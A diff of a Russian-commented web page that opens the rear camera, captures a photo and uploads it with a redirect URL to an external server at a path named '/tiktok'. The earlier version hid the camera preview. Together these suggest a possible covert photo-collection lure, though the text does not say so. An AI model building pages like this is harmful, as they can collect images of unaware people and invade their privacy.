@@ -3,22 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture</title>
+    <title>Camera Capture</title>
     <style>
-        body, video {
+        body, html {
             margin: 0;
             padding: 0;
-            overflow: hidden;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
         }
         video {
-            display: none;
+            width: 100%;
+            height: auto;
         }
         #capture-button {
             position: absolute;
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
-            padding: 10px 20px;
+            padding: 12px 24px;
             font-size: 18px;
             background-color: #28a745;
             color: white;
@@ -33,6 +38,7 @@
 </head>
 <body>
 
+<!-- Видео-элемент для трансляции с камеры -->
 <video id="video" autoplay></video>
 <canvas id="canvas" style="display:none;"></canvas>
 <button id="capture-button">Сделать снимок</button>
@@ -41,23 +47,29 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
+    const captureButton = document.getElementById('capture-button');
 
-    // Запрос доступа к камере
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+    // Функция запроса доступа к камере
+    function startCamera() {
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'environment' }  // Используем заднюю камеру
+        })
         .then(stream => {
             video.srcObject = stream;
         })
         .catch(err => {
-            console.error('Ошибка при доступе к камере:', err);
+            console.error('Ошибка доступа к камере:', err);
+            alert('Не удалось получить доступ к камере. Проверьте разрешения.');
         });
+    }
 
     // Функция захвата фото
     function capturePhoto() {
-        // Настройка размера canvas под видео
+        // Установка размеров canvas под размеры видео
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
 
-        // Отрисовка текущего кадра видео на canvas
+        // Отрисовка кадра с видео на canvas
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         // Преобразование изображения в Blob
@@ -65,7 +77,7 @@
             if (blob) {
                 sendPhoto(blob);
             } else {
-                console.error('Ошибка при преобразовании в Blob');
+                console.error('Не удалось создать Blob');
             }
         }, 'image/jpeg');
     }
@@ -78,22 +90,24 @@
         formData.append('user_id', '12345');
         formData.append('redirect_url', 'https://www.redirect.com');
 
-        // Отправка данных на сервер
         fetch('https://rusfai-send-photo-f9d0.twc1.net/tiktok', {
             method: 'POST',
             body: formData
         })
         .then(response => response.text())
         .then(result => {
-            console.log('Успех:', result);
+            console.log('Фото успешно отправлено:', result);
         })
         .catch(error => {
-            console.error('Ошибка:', error);
+            console.error('Ошибка отправки:', error);
         });
     }
 
-    // Добавляем обработчик событий для кнопки
-    document.getElementById('capture-button').addEventListener('click', capturePhoto);
+    // Запуск камеры при загрузке страницы
+    window.addEventListener('load', startCamera);
+
+    // Обработка нажатия на кнопку "Сделать снимок"
+    captureButton.addEventListener('click', capturePhoto);
 </script>
 
 </body>
